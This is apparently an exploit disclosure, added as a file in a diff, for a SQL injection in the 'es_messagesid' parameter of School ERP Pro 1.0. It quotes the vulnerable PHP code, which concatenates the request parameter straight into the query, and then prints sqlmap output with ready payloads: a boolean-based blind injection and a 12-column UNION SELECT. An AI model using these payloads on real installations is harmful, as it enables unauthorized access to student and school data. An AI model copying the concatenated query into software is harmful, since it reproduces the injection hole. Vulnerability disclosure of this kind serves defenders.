@@ -1,0 +1,44 @@
+# Exploit Title: School ERP Pro 1.0 - 'es_messagesid' SQL Injection
+# Date: 2020-04-28
+# Author: Besim ALTINOK
+# Vendor Homepage: http://arox.in
+# Software Link: https://sourceforge.net/projects/school-erp-ultimate/
+# Version: latest version
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+SQL Injection Detail
+--------------------------------
+*# Vulnerable parameter: es_messagesid*
+*# Vulnerable code:*
+
+if($action=="fullmessage_sent"){
+$msg_qry ="SELECT * FROM es_messages WHERE
+from_id=".$_SESSION['eschools']['user_id']." AND from_type='student' and
+es_messagesid=".*$es_messagesid;*
+$details_message=$db->getrow($msg_qry);
+}
+?>
+
+*Here is the SQLmap output:*
+*----------------------------------------*
+
+GET parameter '*es_messagesid*' is vulnerable.
+sqlmap identified the following injection point(s):
+---
+Parameter: es_messagesid (GET)
+Type: boolean-based blind
+Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+Payload: pid=27&action=fullmessage_sent&es_messagesid=17 OR NOT
+6369=6369
+
+Type: UNION query
+Title: Generic UNION query (random number) - 12 columns
+Payload: pid=27&action=fullmessage_sent&es_messagesid=17 UNION ALL
+SELECT
+6194,6194,6194,6194,6194,6194,CONCAT(0x7162626b71,0x664750636f625866666c63425571426c5277516c49506c696f6548764c5a617977414d4849575a67,0x71707a7671),6194,6194,6194,6194,6194--
+-
+---
+[01:09:41] [INFO] testing MySQL
+[01:09:42] [INFO] confirming MySQL
+[01:09:44] [INFO] the back-end DBMS is MySQL
